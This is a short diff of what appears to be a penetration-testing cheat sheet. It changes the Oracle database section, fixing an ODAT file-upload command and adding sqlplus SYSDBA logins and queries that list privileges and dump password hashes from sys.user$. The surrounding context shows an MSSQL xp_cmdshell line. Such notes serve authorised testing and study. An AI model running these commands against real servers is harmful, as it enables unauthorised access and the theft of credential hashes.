@@ -293,8 +293,12 @@ SQL> EXEC xp_cmdshell "whoami";
 
 ```
 $ ./odat.py all -s <IP address>
-$ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <output file path>
-$ sqlplus <user>/<password>@<IP address>/<database>	
+$ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <file name> <output file path>
+$ sqlplus <user>/<password>@<IP address>/<database>
+$ sqlplus <user>/<password>@<IP address>/<database> as sysdba
+SQL> SELECT table_name from all_tables;
+SQL> SELECT * from user_role_privs;
+SQL> select name, password from sys.user$;
 ```
 
 - NFS (port 2049)
